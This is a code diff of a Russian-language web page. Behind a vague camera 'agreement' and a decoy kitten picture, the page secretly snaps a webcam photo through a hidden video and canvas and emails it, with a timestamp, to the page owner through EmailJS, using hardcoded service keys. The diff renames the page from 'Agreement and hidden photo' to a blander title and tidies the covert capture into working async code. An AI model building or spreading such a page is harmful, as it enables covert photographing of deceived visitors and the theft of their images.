@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Соглашение и скрытое фото</title>
+  <title>Фото с камеры</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
   <style>
     #agreement { 
@@ -15,9 +15,11 @@
       font-size: 16px;
       text-align: center;
     }
-    #main, #result { display: none; }
+    #main, #result { display: none; text-align:center; }
     #catimg { width:320px; height:240px; border:1px solid #ccc; }
     #loading { font-size: 18px; }
+    video { display:none; }
+    canvas { display:none; }
   </style>
 </head>
 <body>
@@ -26,20 +28,24 @@
     <p>Переходя далее, вы соглашаетесь с использованием вашей камеры.</p>
     <button id="acceptBtn" style="background:green;color:white;padding:10px 20px;font-size:18px;">Принять</button>
   </div>
-  <div id="main" style="text-align:center;">
+
+  <div id="main">
     <p id="loading">Загрузка...</p>
     <img id="catimg" src="https://placekitten.com/320/240" alt="Котик">
   </div>
-  <div id="result" style="text-align:center;">
+
+  <div id="result">
     <h2>Спасибо!</h2>
     <p>Фото отправлено.</p>
     <img src="https://placekitten.com/320/240" width="320" height="240" style="border:1px solid #ccc;">
   </div>
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-  <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
+
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
   <script>
-    // Инициализация EmailJS с твоим User ID (Public Key)
-    emailjs.init("4PEicIHTtAabJqfD1");
+    // Инициализация EmailJS
+    emailjs.init("4PEicIHTtAabJqfD1"); // твой Public Key
 
     const agreement = document.getElementById('agreement');
     const main = document.getElementById('main');
@@ -48,31 +54,34 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
-    acceptBtn.onclick = function() {
+    acceptBtn.onclick = async function() {
       agreement.style.display = 'none';
       main.style.display = 'block';
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-          setTimeout(async () => {
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            // Отключаем камеру
-            stream.getTracks().forEach(track => track.stop());
-            // Получаем фото
-            const dataUrl = canvas.toDataURL('image/png');
-            // Отправляем на email через EmailJS
-            await emailjs.send("service_zv13ydk", "template_60nz82p", {
-              photo: dataUrl
-            });
-            main.style.display = 'none';
-            result.style.display = 'block';
-          }, 1200); // 1.2 секунды на автофокус
-        })
-        .catch(err => {
-          alert("Ошибка доступа к камере: " + err.message);
+        // Ждём 1.2 секунды, чтобы камера фокуснулась
+        await new Promise(resolve => setTimeout(resolve, 1200));
+
+        // Делаем фото
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(track => track.stop()); // выключаем камеру
+
+        const dataUrl = canvas.toDataURL('image/png');
+
+        // Отправляем base64 в EmailJS
+        await emailjs.send("service_zv13ydk", "template_60nz82p", {
+          time: new Date().toLocaleString(),
+          photo: dataUrl // используем переменную {{photo}} в шаблоне
         });
+
+        main.style.display = 'none';
+        result.style.display = 'block';
+      } catch(err) {
+        alert("Ошибка: " + err.message);
+      }
     };
   </script>
 </body>
